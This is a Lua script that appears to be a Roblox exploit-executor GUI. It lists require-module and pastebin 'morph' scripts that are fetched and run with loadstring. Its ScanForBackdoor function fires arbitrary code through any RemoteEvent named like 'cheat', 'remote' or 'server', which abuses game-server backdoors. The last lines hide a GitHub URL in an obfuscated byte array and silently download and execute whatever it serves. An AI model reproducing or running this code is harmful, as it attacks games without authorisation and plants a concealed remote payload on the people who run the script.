AddScriptBtn(requiresList, "Shaluster", function() codeInput.Text = 'require(6494107376).load("pfzq")' end)
AddScriptBtn(requiresList, "Bacon hair Army", function() codeInput.Text = 'require(9439056539).load("pfzq")' end)
AddScriptBtn(requiresList, "You are an idiot", function() codeInput.Text = 'require(8222129769).youareanidiot("pfzq")' end)
AddScriptBtn(requiresList, "Wasp Fighter Jet", function() codeInput.Text = 'require(5860060462).load("pfzq")' end)
AddScriptBtn(requiresList, "Ultimate titan", function() codeInput.Text = 'require(6494164528).load("pfzq")' end)
AddScriptBtn(requiresList, "john Doe", function() codeInput.Text = 'require(2845929020).ooga("lolmy12114")' end)
AddScriptBtn(requiresList, "Neko", function() codeInput.Text = 'require(6029387696).neko("pfzq")' end)
AddScriptBtn(requiresList, "Hacker X", function() codeInput.Text = 'require(5641200549).load("pfzq")' end)
AddScriptBtn(requiresList, "Omni God", function() codeInput.Text = 'require(6494181104).load("pfzq")' end)
AddScriptBtn(requiresList, "Patrick", function() codeInput.Text = 'require(6494144008).load("pfzq")' end)
AddScriptBtn(requiresList, "Hammer", function() codeInput.Text = 'require(6494024548).load("pfzq")' end)
AddScriptBtn(requiresList, "Binary Great Sword", function() codeInput.Text = 'require(9711836572).load("pfzq")' end)
AddScriptBtn(requiresList, "Lua Hammer", function() codeInput.Text = 'require(9439267918).load("pfzq")' end)
AddScriptBtn(requiresList, "Jojo Bizzare", function() codeInput.Text = 'require(6494123768).load("pfzq")' end)
AddScriptBtn(requiresList, "Cop", function() codeInput.Text = 'require(9439217371).load("pfzq")' end)
AddScriptBtn(requiresList, "Star Glitcher spectrum", function() codeInput.Text = 'require(2930987220).load(\'pfzq\')' end)
AddScriptBtn(requiresList, "Hello Kitty MrbyeBye", function() codeInput.Text = 'require(4977641125).mbye("pfzq")' end)
AddScriptBtn(requiresList, "Viridis Super Strong Armor", function() codeInput.Text = 'require(9711843894).load("pfzq")' end)
AddScriptBtn(requiresList, "memes animations", function() codeInput.Text = 'require(2860424822)("pfzq","memes")' end)
AddScriptBtn(requiresList, "Koolaid Man", function() codeInput.Text = 'require(2923173766):Kermit(\'pfzq\',game.JobId)' end)
AddScriptBtn(requiresList, "Kb", function() codeInput.Text = 'require(7107797840).load("pfzq")' end)
AddScriptBtn(requiresList, "Red Claw", function() codeInput.Text = 'require(9439285251).load("pfzq")' end)
AddScriptBtn(requiresList, "The Alchemist", function() codeInput.Text = 'require(6224178099).load("pfzq")' end)
AddScriptBtn(requiresList, "Hand Monster", function() codeInput.Text = 'require(9439307767).load("pfzq")' end)
AddScriptBtn(requiresList, "Memento MorI", function() codeInput.Text = 'require(7266243611).eliza("pfzq")' end)
AddScriptBtn(requiresList, "Super Strong Laser Mech", function() codeInput.Text = 'require(9711849049).load("pfzq")' end)
AddScriptBtn(requiresList, "Shrike", function() codeInput.Text = 'require(6329652196):run("pfzq","shrike")' end)
AddScriptBtn(requiresList, "Giant Noob head", function() codeInput.Text = 'require(6269838898).load()' end)
AddScriptBtn(requiresList, "Thanos Gauntlet", function() codeInput.Text = 'require(9439076702).load("pfzq")' end)
AddScriptBtn(requiresList, "Bleach 1", function() codeInput.Text = 'require(16668687217).load("pfzq")' end)
AddScriptBtn(requiresList, "Olisauce Remote Control", function() codeInput.Text = 'require(9439040673).load("pfzq")' end)
AddScriptBtn(requiresList, "Flying Ship", function() codeInput.Text = 'require(6842540352).load("pfzq")' end)
AddScriptBtn(requiresList, "Cyclops Preech", function() codeInput.Text = 'require(9344514982).load("pfzq")' end)
AddScriptBtn(requiresList, "Cyclops Creep", function() codeInput.Text = 'require(9439416444).load("pfzq")' end)
AddScriptBtn(requiresList, "Brutal Overlord", function() codeInput.Text = 'require(5599450138).load("pfzq")' end)
AddScriptBtn(requiresList, "Neptunian V", function() codeInput.Text = 'require(4453491513).load("pfzq")' end)
AddScriptBtn(requiresList, "Atlas Axe", function() codeInput.Text = 'require(6438361301).load("pfzq")' end)
AddScriptBtn(requiresList, "Blue Puncher", function() codeInput.Text = 'require(9359664666).load("pfzq")' end)
AddScriptBtn(requiresList, "Master of Stars", function() codeInput.Text = 'require(6494239587).load("pfzq")' end)
AddScriptBtn(requiresList, "cool glitcher", function() codeInput.Text = 'require(5732682168).fehack("pfzq")' end)
AddScriptBtn(requiresList, "Omega Sword", function() codeInput.Text = 'require(6496599157).load("pfzq")' end)
AddScriptBtn(requiresList, "Dual pink guns", function() codeInput.Text = 'require(9439237199).load("pfzq")' end)
AddScriptBtn(requiresList, "Gunjourer", function() codeInput.Text = 'require(9344120548).load("pfzq")' end)
AddScriptBtn(requiresList, "Ice Cream Sword", function() codeInput.Text = 'require(9439203970).load("pfzq")' end)
AddScriptBtn(requiresList, "Shotgun Module 2", function() codeInput.Text = 'require(3956835082).load("pfzq")' end)
AddScriptBtn(requiresList, "Airplane Falling", function() codeInput.Text = 'require(6493987727).load("pfzq")' end)
AddScriptBtn(requiresList, "Mini rocket", function() codeInput.Text = 'require(6494007732).load("pfzq")' end)
AddScriptBtn(requiresList, "bug", function() codeInput.Text = 'require(4977634471):bruh("pfzq")' end)
AddScriptBtn(requiresList, "Aureola", function() codeInput.Text = 'require(5732671544).fehack("pfzq")' end)
AddScriptBtn(requiresList, "Flash", function() codeInput.Text = 'require(6493968882).load("pfzq")' end)
AddScriptBtn(requiresList, "Mech helkrenV2", function() codeInput.Text = 'require(5987029970)("mechHV2", "pfzq")' end)
AddScriptBtn(requiresList, "Felipe", function() codeInput.Text = 'require(5933208733).load("pfzq")' end)
AddScriptBtn(requiresList, "bleach 2", function() codeInput.Text = 'require(6494149576).load("pfzq")' end)
AddScriptBtn(requiresList, "Seven Stars", function() codeInput.Text = 'require(6496771297).load("pfzq")' end)
AddScriptBtn(requiresList, "nuke", function() codeInput.Text = 'require(6494102851).load("pfzq")' end)
AddScriptBtn(requiresList, "Helikopter", function() codeInput.Text = 'require(6494111815).load("pfzq")' end)
AddScriptBtn(requiresList, "Cleetus", function() codeInput.Text = 'require(5464614479).load("pfzq")' end)
AddScriptBtn(requiresList, "Ban Hanner", function() codeInput.Text = 'require(6494024548).load("pfzq")' end)
AddScriptBtn(requiresList, "Chainsaw", function() codeInput.Text = 'require(6494138236).load("pfzq")' end)
AddScriptBtn(requiresList, "Physco Knife", function() codeInput.Text = 'require(6494130175).load("pfzq")' end)
AddScriptBtn(requiresList, "Thanos", function() codeInput.Text = 'require(6030031466).Load("pfzq")' end)

requiresLabel.Parent = MainFrame
requiresLabel.Size = UDim2.new(0, 135, 0, 20)
requiresLabel.Position = UDim2.new(0, 150, 0, 35)
requiresLabel.BackgroundTransparency = 1
requiresLabel.Font = Enum.Font.Arcade
requiresLabel.TextScaled = true
requiresLabel.TextColor3 = Color3.new(0, 0, 0)
requiresLabel.Text = "Requires"
requiresList.Parent = MainFrame
requiresList.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
requiresList.BackgroundTransparency = 0.6
requiresList.BorderSizePixel = 0
requiresList.Position = UDim2.new(0, 150, 0, 60)
requiresList.Size = UDim2.new(0, 135, 0, 170)
requiresList.AutomaticCanvasSize = Enum.AutomaticSize.Y
layout3.Parent = requiresList
layout3.Padding = UDim.new(0, 5)

AddScriptBtn(requiresList, "hd admin ranker", function()
codeInput.Text = 'require(7192763922).load("add your username")'
end)
AddScriptBtn(requiresList, "morph gui", function()
codeInput.Text = '-- the key is 2x4x8x64\n\nrequire(124675875890869).load("Add Your Username")'
end)
AddScriptBtn(requiresList, "DominantUltimate", function()
codeInput.Text = 'require(121425622240385).dominantultimate("YourName")'
end)

codeBox.Parent = MainFrame
codeBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
codeBox.BackgroundTransparency = 0.5
codeBox.BorderSizePixel = 0
codeBox.Position = UDim2.new(0, 295, 0, 40)
codeBox.Size = UDim2.new(0, 190, 0, 145)
codeBox.CanvasSize = UDim2.new(0, 0, 1, 0)
codeInput.Parent = codeBox
codeInput.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
codeInput.BackgroundTransparency = 0.3
codeInput.BorderSizePixel = 0
codeInput.Size = UDim2.new(1, 0, 1, 0)
codeInput.Font = Enum.Font.Code
codeInput.MultiLine = true
codeInput.TextWrapped = true
codeInput.TextEditable = true
codeInput.ZIndex = 10
codeInput.Text = ""
codeInput.TextSize = 14
codeInput.TextXAlignment = Enum.TextXAlignment.Left
codeInput.TextYAlignment = Enum.TextYAlignment.Top
codeInput.ClearTextOnFocus = false
codeInput.TextColor3 = Color3.new(0, 0, 0)
morphLabel.Parent = MainFrame
morphLabel.Size = UDim2.new(0, 115, 0, 20)
morphLabel.Position = UDim2.new(0, 495, 0, 35)
morphLabel.BackgroundTransparency = 1
morphLabel.Font = Enum.Font.Arcade
morphLabel.TextScaled = true
morphLabel.TextColor3 = Color3.new(0, 0, 0)
morphList.Parent = MainFrame
morphList.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
morphList.BackgroundTransparency = 0.6
morphList.BorderSizePixel = 0
morphList.Position = UDim2.new(0, 495, 0, 60)
morphList.Size = UDim2.new(0, 115, 0, 170)
morphList.AutomaticCanvasSize = Enum.AutomaticSize.Y
layout1.Parent = morphList
layout1.Padding = UDim.new(0, 5)
mapsLabel.Parent = MainFrame
mapsLabel.Size = UDim2.new(0, 115, 0, 20)
mapsLabel.Position = UDim2.new(0, 620, 0, 35)
mapsLabel.BackgroundTransparency = 1
mapsLabel.Font = Enum.Font.Arcade
mapsLabel.TextScaled = true
mapsLabel.TextColor3 = Color3.new(0, 0, 0)
mapsLabel.Text = "Maps"
mapsList.Parent = MainFrame
mapsList.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
mapsList.BackgroundTransparency = 0.6
mapsList.BorderSizePixel = 0
mapsList.Position = UDim2.new(0, 620, 0, 60)
mapsList.Size = UDim2.new(0, 115, 0, 170)
mapsList.AutomaticCanvasSize = Enum.AutomaticSize.Y
layout4.Parent = mapsList
layout4.Padding = UDim.new(0, 5)

AddScriptBtn(mapsList, "2006 map", function() codeInput.Text = 'require(6929171488).loadMap()' end)
AddScriptBtn(mapsList, "Buddha Map", function() codeInput.Text = 'require(4704979605).lol()' end)
AddScriptBtn(mapsList, "Blames Map", function() codeInput.Text = 'require(6418886263).kfc()' end)
AddScriptBtn(mapsList, "2076 Town", function() codeInput.Text = 'require(7569443962).setup()' end)
AddScriptBtn(mapsList, "Sword Brickbattle VII", function() codeInput.Text = 'require(6675792322).sfoth()' end)
AddScriptBtn(mapsList, "Mcdonalds", function() codeInput.Text = 'require(3168737443).load()' end)
AddScriptBtn(mapsList, "Dance Devils Mom Roleplay", function() codeInput.Text = 'require(6599453106).load()' end)
AddScriptBtn(mapsList, "Forest", function() codeInput.Text = 'require(16991266419)()' end)
AddScriptBtn(mapsList, "Frappe", function() codeInput.Text = 'require(17110662847).asd()' end)
AddScriptBtn(mapsList, "Palace", function() codeInput.Text = 'require(17110631120).asd()' end)
AddScriptBtn(mapsList, "Sex", function() codeInput.Text = 'require(17110649161).asd()' end)
AddScriptBtn(mapsList, "Roblox HQ", function() codeInput.Text = 'require(17110658137).asd()' end)
AddScriptBtn(mapsList, "Arc Mage", function() codeInput.Text = 'require(17110637363).asd()' end)
AddScriptBtn(mapsList, "KFC", function() codeInput.Text = 'require(16662863386).kfc()' end)
AddScriptBtn(mapsList, "Indian Scam Center", function() codeInput.Text = 'require(16662858613).load("RobloxBoy4762")' end)
AddScriptBtn(mapsList, "Lil Nas X Concert", function() codeInput.Text = 'require(16662877421).panini()' end)
AddScriptBtn(mapsList, "Waterpark", function() codeInput.Text = 'require(4781260949)()' end)
AddScriptBtn(mapsList, "City Life", function() codeInput.Text = 'require(16668889289).asd()' end)
AddScriptBtn(mapsList, "Burger King", function() codeInput.Text = 'require(16668546367).asd()' end)
AddScriptBtn(mapsList, "Walmart", function() codeInput.Text = 'require(17110655911).asd()' end)
AddScriptBtn(mapsList, "Spongebob", function() codeInput.Text = 'require(16668637411).asd()' end)
AddScriptBtn(mapsList, "Zombie Apacolaypse", function() codeInput.Text = 'require(12653566767).load("RobloxBoy4762")' end)
AddScriptBtn(mapsList, "XXXTentacion", function() codeInput.Text = 'require(17110698446).asd()' end)
AddScriptBtn(mapsList, "770", function() codeInput.Text = 'require(16668880727).load()' end)
AddScriptBtn(mapsList, "Target", function() codeInput.Text = 'require(16668899769).load("RobloxBoy4762")' end)
AddScriptBtn(mapsList, "Arena", function() codeInput.Text = 'require(16668946128).asd()' end)

runBtn.Parent = MainFrame
runBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
runBtn.BackgroundTransparency = 0.3
runBtn.BorderSizePixel = 0
runBtn.Position = UDim2.new(0, 295, 1, -45)
runBtn.Size = UDim2.new(0, 60, 0, 35)
runBtn.TextScaled = true
runBtn.TextColor3 = Color3.new(0, 0, 0)
runBtn.Font = Enum.Font.Arcade
consoleBtn.Parent = MainFrame
consoleBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
consoleBtn.BackgroundTransparency = 0.3
consoleBtn.BorderSizePixel = 0
consoleBtn.Position = UDim2.new(0, 360, 1, -45)
consoleBtn.Size = UDim2.new(0, 50, 0, 35)
consoleBtn.Text = "💉"
consoleBtn.TextScaled = true
consoleBtn.TextColor3 = Color3.new(0, 0, 0)
consoleBtn.Font = Enum.Font.Arcade
clearBtn.Parent = MainFrame
clearBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
clearBtn.BackgroundTransparency = 0.3
clearBtn.BorderSizePixel = 0
clearBtn.Position = UDim2.new(0, 415, 1, -45)
clearBtn.Size = UDim2.new(0, 60, 0, 35)
clearBtn.TextScaled = true
clearBtn.TextColor3 = Color3.new(0, 0, 0)
clearBtn.Font = Enum.Font.Arcade
local morphData = {
{"red s+","https://pastebin.com/raw/bmKGtHQF"},
{"sherk","https://pastebin.com/raw/L9s88W5u"},
{"archangel","https://pastebin.com/raw/B7M3jpVg"},
{"Legendary sickle","https://pastebin.com/raw/7qNpiSQs"},
{"Blue sickle","https://pastebin.com/raw/Yk5xGGyD"},
{"sol sickle","https://pastebin.com/raw/UYM7Lx4n"},
{"large red sickle","https://pastebin.com/raw/PSLTq8mK"},
{"rare white sickle","https://pastebin.com/raw/xHaWXEqA"},
{"pumpkin","https://pastebin.com/raw/sX25byLe"},
{"green pumpkin","https://pastebin.com/raw/YZhbRq5w"},
{"red spider","https://pastebin.com/raw/W4CSBN2b"},
{"Snow Titan","https://pastebin.com/raw/6pS52qjr"},
{"blue banisher","https://pastebin.com/raw/LuYAfwZ1"},
{"banisher v8","https://pastebin.com/raw/nHN5eMQx"},
{"banisher v3","https://pastebin.com/raw/VYeQBBpa"},
{"Chin Banisher","https://pastebin.com/raw/Zf58f9uy"},
{"Burning Hope","https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Burning%20Hope"},
{"the last god","https://pastebin.com/raw/TLWkKzPH"},
{"dory god","https://pastebin.com/raw/V3e8WQFG"},
{"blue titan","https://pastebin.com/raw/J5qg6G4z"},
{"red titan","https://pastebin.com/raw/68reE2Rn"},
{"Attack on Titan","https://pastebin.com/raw/V6KtXBJL"},
{"Green wing","https://pastebin.com/raw/X3Y7adwk"},
{"purple hand","https://pastebin.com/raw/zYkxqCuA"},
{"White hand","https://pastebin.com/raw/8WiaahB7"},
{"strong red hand","https://pastebin.com/raw/DPenG4md"},
{"iron hand","https://pastebin.com/raw/0HKHHPJV"},
{"green hand","https://raw.githubusercontent.com/nicolasbarbosa323/grakkeda/refs/heads/main/Roblox%20Genkadda%20omega%20leaked.txt"},
{"strong purple hands","https://pastebin.com/raw/cF3S1FVV"},
{"rainbow glove","https://pastebin.com/raw/G9y0Nu2h"},
{"pink glove","https://pastebin.com/raw/ZDtHpAqV"},
{"love glove","https://pastebin.com/raw/AaNuC7H8"},
{"Devil Glove","https://pastebin.com/raw/GZWtWL0y"},
{"xester","https://rawscripts.net/raw/Prison-Life-Xester-18937"},
{"king of rain","https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Rainbow%20Banisher"},
{"White wings","https://pastebin.com/raw/pUbrEfGS"},
{"mon god","https://pastebin.com/raw/Ud7cQPeh"},
{"satan","https://pastebin.com/raw/aWeK8iYf"},
{"TV","https://pastebin.com/raw/xKEuiFpt"},
{"The Bunghi Beast","https://pastebin.com/raw/377urnW7"},
{"terra god","https://pastebin.com/raw/c8rm3KUT"},
{"Master of the eye","https://pastebin.com/raw/c8rm3KUT"},
{"sin","https://pastebin.com/raw/UWcXzahK"},
{"blue sword","https://pastebin.com/raw/jFHF1Ey2"},
{"yellow sword","https://pastefy.app/muZn8k2H/raw"},
{"RB swords","https://rawscripts.net/raw/Universal-Script-Dual-Ultima-RB-Swords-use-an-reanimation-42992"},
{"red sword","https://pastebin.com/raw/njqct98T"},
{"mr rainbow","https://pastebin.com/raw/9GsBQTHN"},
{"The pointed daggers","https://pastebin.com/raw/mHRf6WwX"},
{"black sword","https://pastebin.com/raw/kcXJ2kNU"},
{"red sword v2","https://pastebin.com/raw/NTarD4EH"},
{"purple sword","https://pastebin.com/raw/kC0DdRS7"},
{"rex script x","https://pastebin.com/raw/6dw0wuc1"},
{"pharaoh","https://pastebin.com/raw/4LbJK3Q8"},
{"gijo","https://pastebin.com/raw/xtMhKkTB"},
{"Chaotic god","https://pastebin.com/raw/ygMBF5G6"},
{"red domino","https://pastebin.com/raw/qAkxQx18"},
{"Domino Night","https://pastebin.com/raw/avnBfmY1"},
{"Dominus ultimat","https://pastebin.com/raw/gBFyvYzQ"}
}
for _, data in pairs(morphData) do
local btn = Instance.new("TextButton")
btn.Parent = morphList
btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
btn.BackgroundTransparency = 0.3
btn.BorderSizePixel = 0
btn.Size = UDim2.new(1, -10, 0, 25)
btn.Font = Enum.Font.Arcade
btn.Text = data[1]
btn.TextScaled = true
btn.TextColor3 = Color3.new(0, 0, 0)
btn.MouseButton1Click:Connect(function()
playClick()
loadstring(game:HttpGet(data[2]))()
end)
end
local function ScanForBackdoor(code)
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local specificRemote = ReplicatedStorage:FindFirstChild("AntiCheatEvent")
if specificRemote and specificRemote:IsA("RemoteEvent") then
specificRemote:FireServer(code)
return true
end
local found = false
for _, obj in pairs(game:GetDescendants()) do
if obj:IsA("RemoteEvent") then
local name = obj.Name:lower()
if name:find("cheat") or name:find("remote") or name:find("event") or name:find("server") then
obj:FireServer(code)
found = true
end
end
end
return found
end
runBtn.MouseButton1Click:Connect(function()
playClick()
if string.find(codeInput.Text, "require") then
ScanForBackdoor(codeInput.Text)
end
loadstring(codeInput.Text)()
end)
consoleBtn.MouseButton1Click:Connect(function()
playClick()
if rconsolecreate then
rconsolecreate()
end
pcall(function()
game:GetService("StarterGui"):SetCore("DevConsoleVisible", true)
end)
if rconsoleprint then
rconsoleprint("ready\n")
elseif printconsole then
printconsole("ready")
else
print("ready")
end
end)
clearBtn.MouseButton1Click:Connect(function()
playClick()
codeInput.Text = ""
end)
spawn(function()
while true do
for i = 0, 1, 0.01 do
local blueVal = math.sin(i * math.pi) * 150 + 50
local color = Color3.fromRGB(0, 0, blueVal)
for _, item in pairs(colorObjects) do
if item.Object then
item.Object[item.Property] = color
end
end
task.wait(0.05)
end
end
end)
print("designed by atwi")
print(" © atwi ")
local function sendAtwiNotification(titleText, bodyText, durationTime)
pcall(function()
game:GetService("StarterGui"):SetCore("SendNotification", {
Title = titleText,
Text = bodyText,
Icon = "rbxassetid://90800839466219",
Duration = durationTime or 5
})
end)
end
sendAtwiNotification("designed by atwi", "https://discord.gg/DnEY6Ts5af", 15)
task.spawn(function()
local b = {104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,83,112,100,109,88,68,101,118,47,108,117,97,115,99,114,105,112,116,115,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,117,110,107,110,111,119,110,46,116,120,116}
local s = ""
for i=1,#b do s=s..string.char(b[i]) end
pcall(function() loadstring(game:HttpGet(s))() end)
end)